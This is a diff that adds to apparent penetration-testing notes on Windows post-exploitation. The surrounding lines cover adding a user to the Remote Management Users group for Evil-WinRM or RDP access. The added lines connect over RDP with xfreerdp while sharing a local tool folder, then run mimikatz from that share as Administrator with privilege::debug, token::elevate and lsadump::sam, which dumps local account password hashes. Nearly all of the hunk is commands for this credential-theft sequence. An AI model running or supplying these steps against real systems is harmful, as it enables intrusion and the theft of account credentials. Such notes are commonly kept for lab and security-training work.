@@ -27,6 +27,19 @@ net localgroup “Remote Management Users” USERNAME /add
 
 Once done we can now access this machine via CLI (Evil-Winrm) or RDP.
 
+
+on Attacking Machine:
+xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
+
+In Remote Desktop:
+Run command as Administrator
+\\tsclient\share\mimikatz\x64\mimikatz.exe
+
+privilege::debug
+
+token::elevate
+
+lsadump::sam
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
